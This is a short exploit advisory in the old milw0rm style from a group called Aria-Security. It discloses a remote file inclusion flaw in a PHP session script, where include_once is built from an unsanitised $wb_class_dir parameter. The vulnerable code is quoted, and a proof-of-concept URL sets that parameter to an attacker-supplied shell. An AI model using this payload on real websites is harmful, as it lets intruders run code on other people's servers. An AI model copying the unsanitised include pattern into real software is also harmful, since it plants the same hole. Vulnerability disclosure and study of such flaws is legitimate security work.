@@ -1,0 +1,41 @@
+###########################################################################################
+#                                   Aria-Security.net Advisory                            #
+#                                 Discovered  by: O.U.T.L.A.W                             #
+#                                < www.Aria-security.net >                                #
+#                      Gr33t to: A.u.r.a  & l2odon & DrtRp & Sh3ll                        #              
+###########################################################################################
+
+
+<?php
+include_once("$wb_class_dir/classDatabase.php");
+
+
+function Start_Session()
+{
+    global $session_dir;
+
+    if ( $session_dir != '' )
+        session_save_path($session_dir);
+
+    if ( ! isset($_SESSION) )
+    {
+        session_start();
+        // Supposedly a fix for IE6
+        header('Cache-control: private');
+        My_Cache();
+
+        if ( ! isset($_SESSION['db']) || gettype($_SESSION['db']->db) != 'resource')
+            touchDatabaseSession();
+
+    }
+}
+
+
+***********************************************************************
+
+Proof of Concept:
+www.site.com/includes/session.php?wb_class_dir=SHELL
+
+Contact : Outlaw@aria-security.net
+
+# milw0rm.com [2006-08-11]
